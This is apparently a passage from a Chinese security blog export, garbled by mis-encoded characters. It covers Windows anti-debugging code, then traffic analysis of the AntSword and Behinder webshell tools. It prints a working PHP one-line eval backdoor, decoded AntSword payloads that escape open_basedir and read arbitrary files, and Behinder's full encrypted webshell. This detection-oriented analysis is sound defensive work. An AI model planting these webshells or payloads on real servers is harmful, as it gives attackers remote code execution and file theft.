pfnNtQueryInformationProcess NtQueryInformationProcess = NULL; HMODULE hNtDll = LoadLibrary(TEXT(&quot;ntdll.dll&quot;)); if (hNtDll) &#123; NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, &quot;NtQueryInformationProcess&quot;); if (NtQueryInformationProcess) &#123; NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &amp;debugFlag, sizeof(DWORD), NULL); &#125; &#125; if (debugFlag != 0) &#123; ::MessageBox(NULL, TEXT(&quot;detect debugger&quot;), TEXT(&quot;detect debugger&quot;), MB_OK); &#125;&#125;int main()&#123; ::MessageBox(NULL, arr, TEXT(&quot;test&quot;), MB_OK); system(&quot;pause&quot;);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;)PIMAGE_TLS_CALLBACK pTLS_Callback[] = &#123; TlsCallBackFunction1,NULL &#125;;#pragma data_seg() IsDebuggerPresentå¾®è½¯ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªAPIå‡½æ•°ç”¨æ¥æ£€æµ‹å½“å‰ç¨‹åºæ˜¯å¦æ­£åœ¨è¢«è°ƒè¯• å‡½æ•°åŸå‹ 12345BOOL IsDebuggerPresent();Return valueIf the current process is running in the context of a debugger, the return value is nonzero.If the current process is not running in the context of a debugger, the return value is zero. demo 123456void NTAPI TlsCallBackFunction1(PVOID Handle, DWORD Reason, PVOID Reserve) &#123; if (IsDebuggerPresent()) &#123; ::MessageBox(NULL, TEXT(&quot;detect debugger&quot;), TEXT(&quot;detect debugger&quot;), MB_OK); &#125;;&#125; debugFlagçš„å¦™ç”¨è°ƒè¯•å™¨é™„åŠ è¿›ç¨‹æ—¶ï¼ŒNtQueryInformationProcessä¸­ä¸ºdebugFlagèµ‹å€¼ä¸º0xffff ffffï¼Œæœªè°ƒè¯•æ—¶debugFlagä¸º0ï¼Œå€Ÿç”¨debugFlagåœ¨ä¸åŒçŠ¶æ€ä¸‹çš„å€¼æ¥å¯¹æŸäº›å…³é”®æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œæ¥å®ç°æ•°æ®ä¿æŠ¤ä»¥åŠåè°ƒè¯•çš„æ•ˆæœã€‚ä¾‹å¦‚ä¸€ä¸‹demo 123456789101112131415int main()&#123; //printf(&quot;%x,%x&quot;, TlsCallBackFunction1, &amp;TlsCallBackFunction2); //printf(&quot;%x&quot;, debugFlag); if (debugFlag != 0) &#123; printf(&quot;debuging&quot;); &#125; //check successful char arr[] = &#123; 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x73, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x66, 0x75, 0x6C,0x21, 0x21, 0x00 &#125;; for (int i = 0; i &lt; 19; i++) &#123; arr[i] = arr[i] ^ debugFlag; &#125; ::MessageBox(NULL, arr, TEXT(&quot;test&quot;), MB_OK); system(&quot;pause&quot;);&#125; æœªè°ƒè¯•æ—¶å¼¹å‡ºcheck successfulï¼Œè°ƒè¯•æ—¶æ•°æ®äº¦æˆ–å¼¹å‡ºä¹±ç ","categories":[{"name":"windowsé€†å‘ï¼Œå†…æ ¸å®‰å…¨","slug":"windowsé€†å‘ï¼Œå†…æ ¸å®‰å…¨","permalink":"http://example.com/categories/windows%E9%80%86%E5%90%91%EF%BC%8C%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"windows,windowså®‰å…¨,åè°ƒè¯•","slug":"windows-windowså®‰å…¨-åè°ƒè¯•","permalink":"http://example.com/tags/windows-windows%E5%AE%89%E5%85%A8-%E5%8F%8D%E8%B0%83%E8%AF%95/"}]},{"title":"å¸¸è§Webshellè¿æ¥å·¥å…·æµé‡åˆ†æ","slug":"å†°èæµé‡åˆ†æ","date":"2022-09-08T09:47:19.000Z","updated":"2022-09-08T09:48:27.258Z","comments":true,"path":"2022/09/08/å†°èæµé‡åˆ†æ/","link":"","permalink":"http://example.com/2022/09/08/%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"å¸¸è§Webshellè¿æ¥å·¥å…·æµé‡åˆ†æèšå‰‘ç½‘ç«™åé—¨ä¸€å¥è¯1&lt;?php eval($_POST[&#x27;bckdor&#x27;]);?&gt; wiresharkæŠ“åŒ… è¿æ¥è¿‡ç¨‹åˆ†æ http requestæ•°æ®åŒ… 123456789POST /ma.php HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)Content-Type: application/x-www-form-urlencodedContent-Length: 1643Connection: closebckdor=%40eval(%40base64_decode(%24_POST%5B&#x27;e435b616de0459&#x27;%5D))%3B&amp;e435b616de0459=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjE1MzA5NTg5MWJkZCI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiBAYmFzZTY0X2VuY29kZSgkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI1NTFhIi4iYzc1ODAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImY1NSIuIjJiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%2FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7 urlè§£ç å 1bckdor=@eval(@base64_decode($_POST[&#x27;e435b616de0459&#x27;]));&amp;e435b616de0459=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjE1MzA5NTg5MWJkZCI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiBAYmFzZTY0X2VuY29kZSgkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI1NTFhIi4iYzc1ODAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImY1NSIuIjJiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk/JHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7 è§£ç baseéƒ¨åˆ†+ä»£ç æ ¼å¼åŒ–+åˆ†æ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;); //è·å–ç”¨æˆ·å¯è®¿é—®æœåŠ¡å™¨çš„ç›®å½•if ($opdir) &#123; $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); //å½“å‰æ–‡ä»¶åœ¨æœåŠ¡å™¨çš„ç»å¯¹è·¯å¾„ï¼Œåè·å–ç›®å½•éƒ¨åˆ† $oparr = preg_split(&quot;/;|:/&quot;, $opdir); @array_push($oparr, $ocwd, sys_get_temp_dir()); // foreach($oparr as $item) &#123; //éå†ç”¨æˆ·å¯è®¿é—®æœåŠ¡å™¨çš„ç›®å½•ï¼Œå½“å‰æ–‡ä»¶ç»å¯¹ç›®å½•ï¼Œä¸´æ—¶æ–‡ä»¶ç›®å½• if (!@is_writable($item)) &#123; continue; &#125;; $tmdir = $item.&quot;/.153095891bdd&quot;; @mkdir($tmdir); //åˆ›å»ºä¸´æ—¶ç›®å½•153095891bdd if (!@file_exists($tmdir)) &#123; continue; &#125; @chdir($tmdir); //æ”¹å˜ç›®å½•åˆ°153095891bdd @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); //å°†153095891bddæ·»åŠ åˆ°å¯è®¿é—®æœåŠ¡å™¨çš„ç›®å½• $cntarr = @preg_split(&quot;/\\\\\\\\|\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;@ chdir(&quot;..&quot;); &#125;;@ ini_set(&quot;open_basedir&quot;, &quot;/&quot;);@ rmdir($tmdir); break; &#125;;&#125;;;function asenc($out) &#123; return@ base64_encode($out);&#125;;function asoutput() &#123; $output = ob_get_contents(); ob_end_clean(); echo &quot;551a&quot;. &quot;c7580&quot;; echo@ asenc($output); echo &quot;f55&quot;. &quot;2be&quot;;&#125;ob_start();try &#123; $D = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if ($D == &quot;&quot;) $D = dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]); $R = &quot;&#123;$D&#125; &quot;; if (substr($D, 0, 1) != &quot;/&quot;) &#123; foreach(range(&quot;C&quot;, &quot;Z&quot;) as $L) if (is_dir(&quot;&#123;$L&#125;:&quot;)) $R. = &quot;&#123;$L&#125;:&quot;; &#125; else &#123; $R. = &quot;/&quot;; &#125; $R. = &quot; &quot;; $u = (function_exists(&quot;posix_getegid&quot;)) ? @posix_getpwuid(@posix_geteuid()) : &quot;&quot;; $s = ($u) ? $u[&quot;name&quot;] : @get_current_user(); $R. = php_uname(); $R. = &quot; &#123;$s&#125;&quot;; echo $R;;&#125; catch (Exception $e) &#123; echo &quot;ERROR://&quot;.$e - &gt; getMessage();&#125;;asoutput();die(); ResponseåŒ… 123456789HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 02:43:30 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Connection: closeTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8551ac7580RDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAJQzpEOkU6RjpHOglXaW5kb3dzIE5UIERFU0tUT1AtUkk1OTA2SyA2LjIgYnVpbGQgOTIwMCAoV2luZG93cyA4IEhvbWUgUHJlbWl1bSBFZGl0aW9uKSBBTUQ2NAlyb3lhbA==f552be å‘½ä»¤æ‰§è¡Œåˆ†æ POSTåŒ… 123456789POST /ma.php HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36Content-Type: application/x-www-form-urlencodedContent-Length: 1413Connection: closeb22dda04ada35c=rRRDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAvLmh0YWNjZXNz&amp;bckdor=%40eval(%40base64_decode(%24_POST%5B&#x27;i999ba0d8875f2&#x27;%5D))%3B&amp;i999ba0d8875f2=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmVlMDgzIjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO31AY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gImI5MTkiLiI1ODVkNiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiMGNiIi4iMjNiNyI7fW9iX3N0YXJ0KCk7dHJ5eyRGPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiYjIyZGRhMDRhZGEzNWMiXSwyKSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpP2ZpbGVzaXplKCRGKTo0MDk2KSk7QGZjbG9zZSgkUCk7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D è§£å¯† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657b22dda04ada35c=rRRDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAvLmh0YWNjZXNz&amp;bckdor=@eval(@base64_decode($_POST[&#x27;i999ba0d8875f2&#x27;]));&amp;i999ba0d8875f2=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;);if ($opdir) &#123; $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr = preg_split(&quot;/;|:/&quot;, $opdir);@ array_push($oparr, $ocwd, sys_get_temp_dir()); foreach($oparr as $item) &#123; if (!@is_writable($item)) &#123; continue; &#125;; $tmdir = $item. &quot;/.ee083&quot;;@ mkdir($tmdir); if (!@file_exists($tmdir)) &#123; continue; &#125;@ chdir($tmdir);@ ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr = @preg_split(&quot;/\\\\\\\\|\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;@ chdir(&quot;..&quot;); &#125;;@ ini_set(&quot;open_basedir&quot;, &quot;/&quot;);@ rmdir($tmdir); break; &#125;;&#125;;;function asenc($out) &#123; return@ base64_encode($out);&#125;;function asoutput() &#123; $output = ob_get_contents(); ob_end_clean(); echo &quot;b919&quot;. &quot;585d6&quot;; echo@ asenc($output); echo &quot;0cb&quot;. &quot;23b7&quot;;&#125;ob_start();try &#123; $F = base64_decode(substr($_POST[&quot;b22dda04ada35c&quot;], 2)); $P = @fopen($F, &quot;r&quot;); echo(@fread($P, filesize($F) ? filesize($F) : 4096));@ fclose($P);;&#125; catch (Exception $e) &#123; echo &quot;ERROR://&quot;.$e - &gt; getMessage();&#125;;asoutput();die(); å†°è2.0æµé‡åˆ†æåé—¨è¿™é‡Œä»¥å†°èè‡ªå¸¦çš„php webshellè¿›è¡Œåˆ†æ 123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&#x27;pass&#x27;]))&#123; $key=substr(md5(uniqid(rand())),16); $_SESSION[&#x27;k&#x27;]=$key; print $key;&#125;else&#123; $key=$_SESSION[&#x27;k&#x27;]; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&#x27;openssl&#x27;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&#x27;|&#x27;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @call_user_func(new C(),$params);&#125;?&gt; wiresharkæŠ“åŒ… è¿æ¥è¿‡ç¨‹åˆ†æä¼šå¯¹ Get ä¼ å…¥çš„passè¿™ä¸ªå‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœå­˜åœ¨çš„è¯ä¼šä»¥æ—¶é—´çš„æ–¹å¼ç”Ÿæˆé•¿åº¦16çš„éšæœºkeyï¼Œç„¶åå­˜å…¥åˆ°sessionå½“ä¸­ï¼Œå†å¾€ååˆ¤æ–­æ˜¯å¦å¼€å¯äº†opensslè¿™ä¸ªæ‰©å±•ï¼Œå¼€å¯çš„æƒ…å†µå°±ä¼šå¼€å¯AESè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°ä¸­é—´ç»“æœå­—ç¬¦ä¸² assert|eval(&quot;phpinfo();&quot;) æ­¤æ•°æ®æ˜¯ç”±å†°èåŠ è½½å™¨å‘å‡ºçš„ï¼Œå·²ç»å®šä¹‰å¥½çš„ï¼ŒæœåŠ¡ç«¯åˆ©ç”¨explodeå‡½æ•°å°†æ‹†åˆ†ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²æ•°æ®ï¼Œç„¶åä»¥å¯å˜å‡½æ•°æ–¹å¼è°ƒç”¨ç´¢å¼•ä¸º0çš„æ•°ç»„å…ƒç´ ï¼Œå‚æ•°ä¸ºç´¢å¼•ä¸º1çš„æ•°ç»„å…ƒç´ ï¼Œå³ä¸º assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)ã€‚æ²¡æœ‰å¼€å¯çš„æƒ…å†µï¼Œè¿›è¡Œå¼‚æˆ–å¤„ç†ç„¶åé€šè¿‡base64åŠ å¯†ã€‚è¿™å°±æ˜¯åŒæ—¶åœ¨æ—©æœŸæœ‰ä¸€å®šçš„å…æ€æ•ˆæœï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ç°åœ¨å·²ç»è¢«æ ‡æ³¨ä¸ºå±é™©å‡½æ•°ã€‚ ç¬¬ä¸€æ¬¡getè¯·æ±‚ 123456GET /shell.php?pass=830 HTTP/1.1Content-type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)Host: 192.168.124.15Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-alive 1234567891011121314HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:15:29 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: PHPSESSID=oat0ierrkmesft82r8f3cahld0; path=/Keep-Alive: timeout=5, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8efc6eabf7e74c052 æœåŠ¡å™¨ç«¯äº§ç”Ÿå¯†é’¥å†™å…¥sessionï¼Œsessionå’Œå½“å‰ä¼šè¯ç»‘å®šã€‚ ç¬¬äºŒæ¬¡getè¯·æ±‚ 123456GET /shell.php?pass=862 HTTP/1.1Content-type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)Host: 192.168.124.15Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-alive 1234567891011121314HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:15:29 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: PHPSESSID=guos18kll9it96vi1d5pt2hfv3; path=/Keep-Alive: timeout=5, max=99Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-82799e642b49292f5 ç¬¬äºŒæ¬¡è¯·æ±‚æ˜¯ä¸ºäº†è·å–keyã€‚æ­¤æ—¶çš„ 2799e642b49292f5å°±ä¸ºè§£å¯†ä»£ç çš„keyã€‚ ç¬¬ä¸‰æ¬¡POSTè¯·æ±‚ postçš„æ•°æ®å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„Keyè¿›è¡Œè§£å¯†è·å¾—ä»£ç ï¼Œè§£å¯†ç½‘å€http://tools.bugscaner.com/cryptoaes/ 123456789101112POST /shell.php HTTP/1.1Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=guos18kll9it96vi1d5pt2hfv3; path=/User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)Cache-Control: no-cachePragma: no-cacheHost: 192.168.124.15Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-aliveContent-Length: 11124JJ1vgeFtENJjbeFggAdnhHtjfRuRERCT+s+xGLdeFFNHb2FL64aXqppeyKCYKOtMDJ2Q0MkWM0uK78atu2idaEJlhKfrmMYWe4cZNUSp5Ildf4Ssz+NmZ+mm5bCrwTHeTeGuBr+4sMBL/5rba8aQYVNxM9FurbkuCGL22pSQw7S4lq+wbCoPN+BAhTHFfN19bb3JYeYlP3X/gib0Uc+OObKBLjkjVkoBgwxi9G71ynaBeStn59BnmZSuTNWMa5s2YzAkMwmBcKoHjG362MHAJZnetnGolqI8hyoBZW5RUJkVlFEPM+VScUT+ZEe6tNJfmjCHthycvxbDcNLmiwTQhDAH5WtwwAGjt210wkn278dT1TPDy4hbGMYJVCOBnHNoIGHk3DAqeC0YbJHWRRrk50Y7A7uvHhDtGJmvBQc9S9SlhqMG2UKxMUF+KGlYiuchUMP5uvSIABDEQn7rgyHQWW6EGw3n9BOFStEKngzj/xX/Og9s0YpeUUjeza4PCmRtV3fIaj+ZiwBhbUsbJJ25hZMR9W5HcttD/6nxEx95Aj/jV1f8VxCsHN/0+j8GqmLTIo42IHpTxFGVTI/a2T13uPdhAJ3VLzVS36d9hmiwHIpYBhffnt/zWZW2lCxVTw1h5K3TKvmfGfiNr1JJkdLzdhd3AT0Hi/fZHSOOg/2nn/fpBGolYUGOa2s0KUDWjyGBsmXKwTi5gjeFNL+VQDt4QI+Dv921eQ4Z/tzCT/alkoCC1smBkVz8yYAxsWJJin8PON4aT3T9GzilqxkfRDHjDcVu5uInani3Y0f5QSNCSqfA24FXh2gbH3F1p/3RYKdBhwz7g1jESUV0/vb4ulvKFz9jaaS4j6wx8rIcjzCsIXRISwe3/270jWKWZbI7szA7obaNPxXL/0h5ufQL+mkVDd/L2ByfQXofhidjn7dbfLhkDmAkYhCKGY/R84zOUs8+B81wJ7l2grTF4c6jdvT/oJNnjtBVz6D3i5WInCTzBMe2IGreRIx9KZhhGNs48rzyP5EKkqOv/Sx2HJR+9t54xvxXGKDM67NCidH6e6gr37n2HKUIvZ9fsNSDA+xhFKpkVzLoYxmLthnjuQHXB+Gnw== 12345678910111213HTTP/1.1 200 OKDate: Thu, 08 Sep 2022 07:15:29 GMTServer: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02X-Powered-By: PHP/5.6.9Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheKeep-Alive: timeout=5, max=98Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/html; charset=UTF-8Bnd5kIU4J47rBRDDsjLphOLDXZvLCCz7jxHMJr5Et5nRT4dXOImO66RrGr2hl8wf4VtOZadbTvs/8BE1My4QAoG2emIcUrCIDh40VIS25l/oyrLapJB/2y59OPr4AAmb è¯·æ±‚åŒ…Aesè§£å¯†åçš„æ•°æ® 